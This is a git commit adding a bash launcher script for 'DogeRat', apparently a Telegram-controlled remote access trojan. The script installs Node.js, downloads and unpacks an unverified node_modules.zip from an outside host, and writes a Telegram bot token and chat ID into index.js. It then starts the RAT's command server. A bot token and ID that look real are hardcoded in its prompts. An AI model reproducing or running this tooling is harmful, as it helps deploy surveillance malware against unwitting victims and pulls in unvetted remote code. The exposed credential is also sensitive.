64ee4830c4c0f686419dbcb5b8ad674d866c5cdc
Shahilali12 <89555969+Shahilali12@users.noreply.github.com>
2024-04-06 10:45:44 +0530

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,74 @@
+#!/usr/bin/env bash
+
+# Set terminal colors
+RED="\033[31m"
+GREEN="\033[32m"
+YELLOW="\033[33m"
+BLUE="\033[34m"
+MAGENTA="\033[35m"
+CYAN="\033[36m"
+RESET="\033[0m"
+
+# Print banner
+echo -e "${RED}██████╗░░█████╗░░██████╗░███████╗██████╗░░█████╗░████████╗"
+echo -e "██╔══██╗██╔══██╗██╔════╝░██╔════╝██╔══██╗██╔══██╗╚══██╔══╝"
+echo -e "██║░░██║██║░░██║██║░░██╗░█████╗░░██████╔╝███████║░░░██║░░░"
+echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
+echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
+echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
+echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░ ░H░I░V░ ░A░Y░A░D░A░V░${RESET}"
+
+
+echo -e "\e[0m"
+echo "Author: shivayadv"
+echo "Github: shivaya-dav"
+echo "Telegram channel: cybershieldx"
+echo -n "Loading "
+timeout 10s bash -c '
+while true
+do
+    echo -n "."
+    sleep 1
+done
+'
+echo " Done!"
+
+
+apt update && apt upgrade -y
+if ! command -v node &> /dev/null
+then
+    echo "Node.js LTS not found. Installing..."
+    pkg install nodejs-lts || { echo "Failed to install Node.js LTS" ; exit 1; }
+else
+    echo "Node.js LTS already installed"
+fi
+if ! command -v wget &> /dev/null
+then
+    echo "wget not found. Installing..."
+    apt install -y wget || { echo "Failed to install wget" ; exit 1; }
+else
+    echo "wget already installed"
+fi
+
+if [ -d "node_modules" ]
+then
+    echo "node_modules already exists. Skipping download."
+else
+    if [ -f "node_modules.zip" ]
+    then
+        echo "node_modules.zip already downloaded. Skipping download."
+    else
+        # Download node_modules.zip file
+        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
+    fi
+
+    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
+    rm node_modules.zip
+fi
+
+read -p "7138788214:AAH3l_SSUz-h17QJttj7ZeqREmAIjC3FXtE: " token
+read -p "7076342781: " id
+sed -i "s/const token = '7138788214:AAH3l_SSUz-h17QJttj7ZeqREmAIjC3FXtE'/const token = '$token'/g" index.js
+sed -i "s/const id = '7076342781'/const id = '$id'/g" index.js
+echo "Server uploaded successfully! Now open new tab and follow rest instructions"
+node index.js
